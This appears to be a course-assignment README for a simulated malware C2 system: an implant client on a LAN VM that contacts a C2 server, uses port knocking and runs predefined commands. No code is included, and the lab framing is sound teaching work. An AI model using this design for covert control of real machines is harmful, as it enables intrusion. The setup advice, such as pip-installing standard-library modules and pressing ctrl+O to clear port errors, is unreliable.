Malware C2

Introduction:
    In this assignment, I designed a Command and Control (C2) system to simulate malware on a Local Area Network (LAN) Virtual Machine (VM). 
    The system consists of two componentsâ€”a C2 server (server.py) deployed on a Wide Area Network (WAN) VM and a malware implant (client.py) 
    deployed on the LAN VM. The primary functionality of the C2 system involves listening for connections, implementing a port-knock 
    sequence, and executing predefined commands on the malware implant.
    

Summary:
    This is the malware client that communicates with the C2 server.
    You can edit the server's IP address in the self explanatory variable (Server IP). 
    
    For option 2, this code assumes that a file named "file.txt" exists in the sae directory as the code. 
    
    I kept some print statements to make reviewing and following the code easy.
    
    

Dependencies: 
    This code was written to be run on linux.
    
    If you try running it and get port in use errors (which are false positives), 
    type ctrl + O in terminal, and try again.
   
    If you lack any of the python packages (socket, hashlib, time, platofrm, subprocess, os),
    then install them with pip3 or pip.

Usage:

    Execute in Terminal:    python3 client.py
